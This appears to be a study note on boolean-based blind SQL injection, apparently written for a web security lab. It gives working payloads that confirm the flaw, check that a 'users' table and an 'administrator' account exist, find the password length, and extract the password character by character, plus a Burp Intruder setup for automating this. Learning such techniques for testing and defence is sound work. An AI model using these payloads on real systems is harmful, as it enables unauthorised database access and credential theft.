# SQLi: Inferential (Boolean-based) Blind

**Category:** SQL Injection

**Sub-Category:** Inferential / Blind

**Logic:** Observing observable changes in the application's UI/Response (e.g., "Welcome Back" message appearing or disappearing) to infer data based on True/False conditions.

---

## Exploit Logic

> The application does not return database errors or data directly. Instead, it behaves differently based on whether the SQL query returns a result.

* **The Condition:** `TrackingId=xyz' AND (SELECT 'x' FROM users WHERE username='administrator')='x`
* **The Signal:** * Logic is **True** → Query returns a row → UI displays **"Welcome back!"**
* Logic is **False** → Query returns no rows → UI **hides** the message.



## Extraction Methodology

### 1. Verify Boolean Behavior

First, confirm the application is vulnerable by testing two opposing logical statements.

* **True Case:** `' AND '1'='1` (Message should appear)
* **False Case:** `' AND '1'='2` (Message should disappear)

### 2. Confirm Table and User Presence

Before exfiltrating data, confirm the target table and specific user exist. If the message disappears, the table or username is incorrect.

```sql
-- Check if table 'users' exists
' AND (SELECT 'x' FROM users LIMIT 1)='x

-- Check if user 'administrator' exists
' AND (SELECT 'x' FROM users WHERE username='administrator')='x
```

### 3. Determine Data Length

Use a comparative operator (`>`) or an equality operator (`=`) to find the length of the string you wish to extract.

```sql
' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') = 20--
```

*If "Welcome back" appears at 20, the password is exactly 20 characters.*

### 4. Data Exfiltration (Character-by-Character)

Use the `SUBSTR()` function to isolate each character and compare it against the alphabet/numbers.

```sql
' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='administrator')='a'--
```

---

## Technical Caveats

* **Database Syntax:**
* **PostgreSQL/MySQL:** Uses `SUBSTR()` or `SUBSTRING()` and `LIMIT 1`.
* **Oracle:** Uses `SUBSTR()` and `WHERE ROWNUM = 1`.


* **String Literals:** Always ensure your character comparisons (like `'a'`) match the case sensitivity of the database collation.
* **UI Consistency:** Ensure no other factors (like session timeouts) are causing the "Welcome back" message to disappear, which would lead to a "False Negative."

## Operational Insights

* **Intruder Configuration:**
* **Attack Type:** Cluster Bomb.
* **Position 1:** The character index: `SUBSTR(password,§1§,1)`.
* **Position 2:** The character guess: `='§a§'`.


* **Grep - Match:** Configure Intruder to "Grep - Match" for the string "Welcome back". This allows you to easily see which requests resulted in a **True** condition.

---

## Concept Summary

**"The Light Switch"**: You are effectively turning a light in the UI on or off. By asking the database a series of Yes/No questions, you can map out the entire contents of a table based solely on whether the "light" (the UI element) stays on.